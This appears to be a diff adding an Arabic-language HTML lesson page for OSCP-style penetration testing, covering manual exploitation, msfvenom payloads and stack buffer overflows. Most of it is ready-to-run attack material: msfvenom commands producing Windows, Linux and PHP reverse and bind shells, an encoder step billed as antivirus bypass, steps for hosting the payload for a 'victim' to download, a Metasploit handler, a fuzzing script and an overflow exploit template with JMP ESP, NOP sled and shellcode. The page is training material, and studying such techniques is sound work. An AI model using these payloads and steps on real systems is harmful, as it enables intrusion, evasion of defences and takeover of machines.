@@ -390,4 +390,327 @@
     </table>
   </div>
 
+  <!-- =========================================================
+       PART 2: MANUAL EXPLOITATION, PAYLOADS, BUFFER OVERFLOW
+       ========================================================= -->
+
+  <div style="margin: 30px 0; border-top: 2px dashed rgba(255,0,68,0.4); padding-top: 25px;">
+    <div style="text-align:center; margin-bottom:25px;">
+      <div style="display:inline-block; background:rgba(255,0,68,0.15); border:2px solid #ff0044; border-radius:12px; padding:12px 30px;">
+        <h2 style="margin:0; color:#ff0044; font-size:1.3em;">💀 Module 6 — Part 2</h2>
+        <p style="margin:5px 0 0; color:#aaa; font-size:0.9em;">Manual Exploitation · msfvenom · Buffer Overflow</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- MANUAL EXPLOITATION -->
+  <div class="cyber-card" style="border-top:3px solid #ff9900;">
+    <div class="card-header">
+      <h3 style="margin:0; color:#ff9900;">💣 1. Manual Exploitation — الاختراق اليدوي</h3>
+    </div>
+    <p style="color:#aaa; line-height:1.9; margin-top:12px;">
+      بدل الاعتماد الكامل على Metasploit، في الـ Manual Exploitation بتستغل الثغرة بنفسك بفهم أعمق.
+      <strong style="color:#f1fa8c;">ده المطلوب تحديداً في الـ OSCP!</strong>
+    </p>
+    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-top:15px;">
+      <div style="background:rgba(255,153,0,0.08); border:1px solid rgba(255,153,0,0.3); border-radius:8px; padding:14px;">
+        <h6 style="color:#ff9900; margin-top:0;">📤 مثال: File Upload → Shell</h6>
+        <ol style="color:#aaa; font-size:0.85em; line-height:2; margin:0;">
+          <li>موقع فيه upload بدون validation</li>
+          <li>ترفع <code>shell.php</code> بدل صورة</li>
+          <li>تفتح الملف من المتصفح</li>
+          <li>تحصل على Web Shell! 🔥</li>
+        </ol>
+      </div>
+      <div style="background:rgba(255,153,0,0.08); border:1px solid rgba(255,153,0,0.3); border-radius:8px; padding:14px;">
+        <h6 style="color:#ff9900; margin-top:0;">📡 مثال: Custom Request</h6>
+        <ol style="color:#aaa; font-size:0.85em; line-height:2; margin:0;">
+          <li>خدمة فيها bug معروف</li>
+          <li>بتبعت request مخصوص</li>
+          <li>البرنامج يتعطل ويفتحلك access</li>
+          <li>تنفذ shellcode! 🔥</li>
+        </ol>
+      </div>
+    </div>
+  </div>
+
+  <!-- MSFVENOM -->
+  <div class="cyber-card" style="border-top:3px solid #bd93f9;">
+    <div class="card-header">
+      <h3 style="margin:0; color:#bd93f9;">🦠 2. msfvenom — مصنع الـ Payloads</h3>
+    </div>
+    <p style="color:#aaa; margin-top:10px;">
+      <strong>msfvenom</strong> = أقوى أداة لإنشاء payloads خبيثة لكل الأنظمة وكل اللغات.
+    </p>
+
+    <!-- Payloads Grid -->
+    <div style="display:grid; grid-template-columns:repeat(auto-fit,minmax(300px,1fr)); gap:12px; margin-top:18px;">
+
+      <!-- Windows Reverse -->
+      <div style="border:1px solid rgba(255,85,85,0.4); border-radius:8px; overflow:hidden;">
+        <div style="background:rgba(255,85,85,0.1); padding:8px 14px; display:flex; justify-content:space-between;">
+          <strong style="color:#ff5555; font-size:0.9em;">🪟 Windows — Reverse Shell</strong>
+          <span style="font-size:0.75em; color:#aaa;">الأكثر استخداماً</span>
+        </div>
+        <div style="padding:12px;">
+          <div class="cmd-ui-box" style="font-size:0.78em;">msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe > reverse.exe</div>
+          <div style="display:grid; grid-template-columns:1fr 1fr; gap:5px; margin-top:8px; font-size:0.78em; color:#6272a4;">
+            <span><code>-p</code> نوع الـ payload</span>
+            <span><code>LHOST</code> IP جهازك</span>
+            <span><code>LPORT</code> البورت</span>
+            <span><code>-f exe</code> نوع الملف</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Windows Bind -->
+      <div style="border:1px solid rgba(255,153,0,0.3); border-radius:8px; overflow:hidden;">
+        <div style="background:rgba(255,153,0,0.08); padding:8px 14px;">
+          <strong style="color:#ff9900; font-size:0.9em;">🔗 Windows — Bind Shell</strong>
+        </div>
+        <div style="padding:12px;">
+          <div class="cmd-ui-box" style="font-size:0.78em;">msfvenom -p windows/meterpreter/bind_tcp RHOST=TARGET LPORT=4444 -f exe > bind.exe</div>
+          <p style="color:#aaa; font-size:0.8em; margin-top:8px;">الضحية بيفتح بورت وأنت بتتصل عليه.</p>
+        </div>
+      </div>
+
+      <!-- Linux -->
+      <div style="border:1px solid rgba(80,250,123,0.3); border-radius:8px; overflow:hidden;">
+        <div style="background:rgba(80,250,123,0.08); padding:8px 14px;">
+          <strong style="color:#50fa7b; font-size:0.9em;">🐧 Linux — ELF Shell</strong>
+        </div>
+        <div style="padding:12px;">
+          <div class="cmd-ui-box" style="font-size:0.78em;">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf</div>
+          <div class="cmd-ui-box" style="font-size:0.78em; margin-top:6px;">chmod +x shell.elf && ./shell.elf</div>
+        </div>
+      </div>
+
+      <!-- PHP -->
+      <div style="border:1px solid rgba(0,191,255,0.3); border-radius:8px; overflow:hidden;">
+        <div style="background:rgba(0,191,255,0.08); padding:8px 14px;">
+          <strong style="color:#00bfff; font-size:0.9em;">🌐 PHP — Web Shell</strong>
+        </div>
+        <div style="padding:12px;">
+          <div class="cmd-ui-box" style="font-size:0.78em;">msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.php</div>
+          <p style="color:#aaa; font-size:0.8em; margin-top:8px;">ترفعه على موقع PHP — يتصل بيك أوتوماتيك عند التشغيل.</p>
+        </div>
+      </div>
+
+      <!-- Encoded -->
+      <div style="border:1px solid rgba(241,250,140,0.3); border-radius:8px; overflow:hidden;">
+        <div style="background:rgba(241,250,140,0.06); padding:8px 14px; display:flex; justify-content:space-between;">
+          <strong style="color:#f1fa8c; font-size:0.9em;">🔒 Encoded — Bypass AV</strong>
+          <span style="font-size:0.75em; color:#ff9900;">⚠️ Advanced</span>
+        </div>
+        <div style="padding:12px;">
+          <div class="cmd-ui-box" style="font-size:0.78em;">msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe</div>
+          <div style="display:grid; grid-template-columns:1fr 1fr; gap:5px; margin-top:8px; font-size:0.78em; color:#6272a4;">
+            <span><code>-e</code> الـ encoder</span>
+            <span><code>-i 3</code> عدد التشفيرات</span>
+          </div>
+          <p style="color:#aaa; font-size:0.8em; margin-top:8px;">يشفر الـ payload 3 مرات لتجاوز الـ Antivirus.</p>
+        </div>
+      </div>
+
+      <!-- List payloads -->
+      <div style="border:1px solid rgba(189,147,249,0.3); border-radius:8px; overflow:hidden;">
+        <div style="background:rgba(189,147,249,0.08); padding:8px 14px;">
+          <strong style="color:#bd93f9; font-size:0.9em;">📋 شوف كل الـ Payloads</strong>
+        </div>
+        <div style="padding:12px;">
+          <div class="cmd-ui-box" style="font-size:0.78em;">msfvenom -l payloads</div>
+          <div class="cmd-ui-box" style="font-size:0.78em; margin-top:6px;">msfvenom -l payloads | grep windows</div>
+          <div class="cmd-ui-box" style="font-size:0.78em; margin-top:6px;">msfvenom -l encoders</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- HOSTING + HANDLER -->
+  <div class="cyber-card" style="border-top:3px solid #50fa7b;">
+    <div class="card-header">
+      <h3 style="margin:0; color:#50fa7b;">🌐 3. استضافة الـ Payload + استقبال الاتصال</h3>
+    </div>
+    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-top:18px;">
+      <div style="background:rgba(0,0,0,0.3); border:1px solid rgba(80,250,123,0.3); border-radius:8px; padding:15px;">
+        <h5 style="color:#50fa7b; margin-top:0;">📡 استضافة الملف (Apache)</h5>
+        <div class="cmd-ui-box" style="font-size:0.85em;">service apache2 start</div>
+        <div class="cmd-ui-box" style="font-size:0.85em; margin-top:6px;">cp reverse.exe /var/www/html/</div>
+        <p style="color:#aaa; font-size:0.85em; margin-top:10px;">الضحية يحمل الملف من:</p>
+        <div style="background:rgba(80,250,123,0.1); padding:8px; border-radius:5px; font-size:0.85em; direction:ltr; text-align:left; color:#50fa7b;">
+          http://YOUR_IP/reverse.exe
+        </div>
+        <p style="color:#6272a4; font-size:0.8em; margin-top:6px;">أو بديل سريع: <code>python3 -m http.server 80</code></p>
+      </div>
+      <div style="background:rgba(0,0,0,0.3); border:1px solid rgba(255,153,0,0.3); border-radius:8px; padding:15px;">
+        <h5 style="color:#ff9900; margin-top:0;">🎧 Handler — استقبال الاتصال</h5>
+        <div class="cmd-ui-box" style="font-size:0.85em;">use exploit/multi/handler</div>
+        <div class="cmd-ui-box" style="font-size:0.85em; margin-top:5px;">set payload windows/meterpreter/reverse_tcp</div>
+        <div class="cmd-ui-box" style="font-size:0.85em; margin-top:5px;">set LHOST YOUR_IP</div>
+        <div class="cmd-ui-box" style="font-size:0.85em; margin-top:5px;">set LPORT 4444</div>
+        <div class="cmd-ui-box" style="font-size:0.85em; margin-top:5px;">run</div>
+        <div style="background:rgba(80,250,123,0.1); border:1px solid #50fa7b; padding:6px; border-radius:4px; margin-top:10px; font-family:monospace; font-size:0.8em; direction:ltr; text-align:left; color:#50fa7b;">
+          [*] Meterpreter session 1 opened! 🔥
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- BUFFER OVERFLOW -->
+  <div class="cyber-card" style="border-top:3px solid #ff0044; background:rgba(255,0,68,0.03);">
+    <div class="card-header">
+      <h3 style="margin:0; color:#ff0044;">💥 4. Buffer Overflow — أخطر وأصعب هجوم 🔥🔥🔥</h3>
+    </div>
+
+    <!-- Theory -->
+    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-top:18px;">
+      <div>
+        <h5 style="color:#fff;">🧠 الفكرة الأساسية:</h5>
+        <p style="color:#aaa; font-size:0.9em; line-height:1.9;">
+          كل برنامج عنده <strong>Buffer</strong> — منطقة ذاكرة محددة الحجم لاستقبال الـ Input.
+          لو بعثت بيانات <strong>أكبر من الـ Buffer</strong>، البيانات الزيادة هتكتب فوق مناطق مهمة في الذاكرة!
+        </p>
+        <div style="background:rgba(255,0,68,0.1); border-left:3px solid #ff0044; padding:10px; border-radius:4px; margin-top:10px; font-size:0.85em;">
+          🎯 <strong>الهدف:</strong> الكتابة فوق الـ <strong>EIP</strong> (Instruction Pointer) — اللي بيتحكم في التعليمة الجاية — وتوجيهه لـ Shellcode بتاعك!
+        </div>
+      </div>
+      <div style="background:rgba(0,0,0,0.4); border:1px solid #44475a; border-radius:8px; padding:15px;">
+        <h6 style="color:#f1fa8c; margin-top:0; text-align:center;">🗺️ تخيل الذاكرة كده:</h6>
+        <div style="direction:ltr; text-align:center; font-family:monospace; font-size:0.8em; line-height:1.8;">
+          <div style="background:#44475a; padding:3px; border-radius:3px;">[ BUFFER — 200 bytes ]</div>
+          <div style="color:#6272a4;">↓ overflow يكتب هنا ↓</div>
+          <div style="background:rgba(255,153,0,0.3); padding:3px; border-radius:3px;">[ EBP — Saved Pointer ]</div>
+          <div style="background:rgba(255,0,68,0.4); padding:3px; border-radius:3px;">[ EIP — Return Address ] ← هنا نتحكم!</div>
+          <div style="background:rgba(80,250,123,0.3); padding:3px; border-radius:3px;">[ SHELLCODE هنا 🔥 ]</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Steps -->
+    <h5 style="color:#f1fa8c; margin-top:25px;">⚙️ خطوات Buffer Overflow (المنهج الكامل):</h5>
+
+    <!-- Step 1 -->
+    <div style="margin-top:15px; border:1px solid rgba(0,191,255,0.3); border-radius:8px; overflow:hidden;">
+      <div style="background:rgba(0,191,255,0.1); padding:8px 15px; display:flex; align-items:center; gap:10px;">
+        <span style="background:#00bfff; color:#000; padding:2px 10px; border-radius:12px; font-size:0.8em; font-weight:bold;">STEP 1</span>
+        <strong style="color:#00bfff;">فحص البرنامج — هل بيقبل input؟</strong>
+      </div>
+      <div style="padding:12px;">
+        <div class="cmd-ui-box" style="font-size:0.85em;">nc 192.168.1.5 9999</div>
+        <p style="color:#aaa; font-size:0.85em; margin-top:6px;">جرب تبعت بيانات وشوف إيه الـ response.</p>
+      </div>
+    </div>
+
+    <!-- Step 2 -->
+    <div style="margin-top:10px; border:1px solid rgba(189,147,249,0.3); border-radius:8px; overflow:hidden;">
+      <div style="background:rgba(189,147,249,0.1); padding:8px 15px; display:flex; align-items:center; gap:10px;">
+        <span style="background:#bd93f9; color:#000; padding:2px 10px; border-radius:12px; font-size:0.8em; font-weight:bold;">STEP 2</span>
+        <strong style="color:#bd93f9;">Fuzzing — عند أد إيه البرنامج يقع؟</strong>
+      </div>
+      <div style="padding:12px;">
+        <div style="background:rgba(0,0,0,0.4); border:1px solid #44475a; border-radius:6px; padding:12px; direction:ltr; text-align:left; font-family:monospace; font-size:0.82em;">
+          <span style="color:#bd93f9;">import</span> socket<br><br>
+          buffer = <span style="color:#f1fa8c;">"A"</span> * <span style="color:#ff9900;">100</span><br><br>
+          <span style="color:#bd93f9;">while True:</span><br>
+          &nbsp;&nbsp;<span style="color:#bd93f9;">try:</span><br>
+          &nbsp;&nbsp;&nbsp;&nbsp;s = socket.socket()<br>
+          &nbsp;&nbsp;&nbsp;&nbsp;s.connect((<span style="color:#f1fa8c;">"192.168.1.5"</span>, <span style="color:#ff9900;">9999</span>))<br>
+          &nbsp;&nbsp;&nbsp;&nbsp;s.send(buffer.encode())<br>
+          &nbsp;&nbsp;&nbsp;&nbsp;buffer += <span style="color:#f1fa8c;">"A"</span> * <span style="color:#ff9900;">100</span><br>
+          &nbsp;&nbsp;<span style="color:#bd93f9;">except:</span><br>
+          &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#50fa7b;">print</span>(<span style="color:#f1fa8c;">"Crashed at:"</span>, len(buffer))<br>
+          &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#bd93f9;">break</span>
+        </div>
+        <p style="color:#50fa7b; font-size:0.85em; margin-top:8px;">✅ هيطبعلك "Crashed at: 2200" — يعني عند 2200 بايت البرنامج وقع!</p>
+      </div>
+    </div>
+
+    <!-- Step 3 -->
+    <div style="margin-top:10px; border:1px solid rgba(255,153,0,0.3); border-radius:8px; overflow:hidden;">
+      <div style="background:rgba(255,153,0,0.1); padding:8px 15px; display:flex; align-items:center; gap:10px;">
+        <span style="background:#ff9900; color:#000; padding:2px 10px; border-radius:12px; font-size:0.8em; font-weight:bold;">STEP 3</span>
+        <strong style="color:#ff9900;">تحديد الـ Offset — فين مكان الـ EIP بالظبط؟</strong>
+      </div>
+      <div style="padding:12px;">
+        <div class="cmd-ui-box" style="font-size:0.85em;">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2200</div>
+        <div class="cmd-ui-box" style="font-size:0.85em; margin-top:6px;">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q EIP_VALUE</div>
+        <p style="color:#aaa; font-size:0.85em; margin-top:8px;">بتبعت pattern فريد وبعدين بتشوف قيمة الـ EIP عند الـ Crash — هتعرف الـ Offset بالظبط.</p>
+        <p style="color:#50fa7b; font-size:0.85em;">مثال: <code>Exact match at offset 1978</code> — يعني الـ EIP في البايت رقم 1978!</p>
+      </div>
+    </div>
+
+    <!-- Step 4 -->
+    <div style="margin-top:10px; border:1px solid rgba(255,0,68,0.4); border-radius:8px; overflow:hidden;">
+      <div style="background:rgba(255,0,68,0.1); padding:8px 15px; display:flex; align-items:center; gap:10px;">
+        <span style="background:#ff0044; color:#fff; padding:2px 10px; border-radius:12px; font-size:0.8em; font-weight:bold;">STEP 4</span>
+        <strong style="color:#ff0044;">إدخال الـ Shellcode — السيطرة الكاملة! 😈</strong>
+      </div>
+      <div style="padding:12px;">
+        <div style="background:rgba(0,0,0,0.4); border:1px solid #44475a; border-radius:6px; padding:12px; direction:ltr; text-align:left; font-family:monospace; font-size:0.82em;">
+          <span style="color:#6272a4;"># Generate shellcode:</span><br>
+          <span style="color:#50fa7b;">msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -b "\x00" -f py</span><br><br>
+          <span style="color:#6272a4;"># Build exploit:</span><br>
+          offset = <span style="color:#ff9900;">1978</span><br>
+          eip = <span style="color:#ff9900;">b"\xAF\x11\x50\x62"</span>  <span style="color:#6272a4;"># JMP ESP address</span><br>
+          nop_sled = <span style="color:#f1fa8c;">b"\x90"</span> * <span style="color:#ff9900;">16</span><br>
+          payload = <span style="color:#f1fa8c;">b"A"</span> * offset + eip + nop_sled + shellcode
+        </div>
+        <p style="color:#50fa7b; font-size:0.85em; margin-top:8px;">✅ الـ EIP بيوجه للـ JMP ESP → NOP Sled → Shellcode → Shell مفتوح! 🔥</p>
+      </div>
+    </div>
+
+    <!-- BOF Targets -->
+    <h5 style="color:#fff; margin-top:20px;">🎯 أماكن تتدرب على BOF:</h5>
+    <div style="display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:10px; margin-top:10px; font-size:0.85em; text-align:center;">
+      <div style="background:rgba(80,250,123,0.08); border:1px solid rgba(80,250,123,0.3); border-radius:8px; padding:10px;">
+        <div style="font-size:1.5em;">🛠️</div>
+        <strong style="color:#50fa7b;">vulnserver</strong>
+        <p style="color:#aaa; font-size:0.8em; margin:4px 0 0;">Windows vulnerable server</p>
+      </div>
+      <div style="background:rgba(0,191,255,0.08); border:1px solid rgba(0,191,255,0.3); border-radius:8px; padding:10px;">
+        <div style="font-size:1.5em;">💻</div>
+        <strong style="color:#00bfff;">TryHackMe</strong>
+        <p style="color:#aaa; font-size:0.8em; margin:4px 0 0;">Buffer Overflow Prep room</p>
+      </div>
+      <div style="background:rgba(189,147,249,0.08); border:1px solid rgba(189,147,249,0.3); border-radius:8px; padding:10px;">
+        <div style="font-size:1.5em;">🐧</div>
+        <strong style="color:#bd93f9;">protostar</strong>
+        <p style="color:#aaa; font-size:0.8em; margin:4px 0 0;">Linux BOF challenges</p>
+      </div>
+      <div style="background:rgba(255,153,0,0.08); border:1px solid rgba(255,153,0,0.3); border-radius:8px; padding:10px;">
+        <div style="font-size:1.5em;">🏠</div>
+        <strong style="color:#ff9900;">OSCP BOF</strong>
+        <p style="color:#aaa; font-size:0.8em; margin:4px 0 0;">في الـ Lab الرسمي</p>
+      </div>
+    </div>
+
+    <!-- Protections -->
+    <div style="background:rgba(0,191,255,0.06); border:1px solid rgba(0,191,255,0.3); border-radius:8px; padding:15px; margin-top:18px;">
+      <h6 style="color:#00bfff; margin-top:0;">🛡️ الحماية من Buffer Overflow:</h6>
+      <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px; font-size:0.85em;">
+        <div style="background:rgba(0,0,0,0.3); padding:8px; border-radius:6px;"><strong style="color:#50fa7b;">ASLR</strong> <span style="color:#aaa;">— عشوائية عناوين الذاكرة</span></div>
+        <div style="background:rgba(0,0,0,0.3); padding:8px; border-radius:6px;"><strong style="color:#50fa7b;">DEP / NX</strong> <span style="color:#aaa;">— منع تنفيذ الكود من الـ Stack</span></div>
+        <div style="background:rgba(0,0,0,0.3); padding:8px; border-radius:6px;"><strong style="color:#50fa7b;">Stack Canaries</strong> <span style="color:#aaa;">— كشف الـ Overflow تلقائياً</span></div>
+        <div style="background:rgba(0,0,0,0.3); padding:8px; border-radius:6px;"><strong style="color:#50fa7b;">Bounds Checking</strong> <span style="color:#aaa;">— التحقق من حجم الـ Input</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PART 2 SUMMARY -->
+  <div class="cyber-card" style="background:rgba(0,0,0,0.4);">
+    <div class="card-header"><h3 style="margin:0; color:#fff;">💡 خلاصة Module 6 — Part 2</h3></div>
+    <table class="interactive-table" dir="rtl" style="margin-top:15px;">
+      <thead><tr><th>الجزء</th><th>الأداة</th><th>الهدف</th></tr></thead>
+      <tbody>
+        <tr><td>Payload Creation</td><td>msfvenom</td><td>إنشاء EXE / ELF / PHP خبيث</td></tr>
+        <tr><td>Hosting</td><td>Apache / Python HTTP</td><td>توصيل الـ Payload للضحية</td></tr>
+        <tr><td>Handler</td><td>multi/handler</td><td>استقبال الـ Reverse Shell</td></tr>
+        <tr><td>AV Bypass</td><td>shikata_ga_nai encoder</td><td>تجاوز الـ Antivirus</td></tr>
+        <tr><td>Fuzzing</td><td>Python socket</td><td>إيجاد حجم الـ Crash</td></tr>
+        <tr><td>Offset</td><td>pattern_create/offset</td><td>تحديد مكان الـ EIP</td></tr>
+        <tr><td style="color:#ff0044; font-weight:bold;">Buffer Overflow</td><td>Custom Python</td><td style="color:#ff0044; font-weight:bold;">سيطرة كاملة على الجهاز 🔥</td></tr>
+      </tbody>
+    </table>
+  </div>
+
 </div>
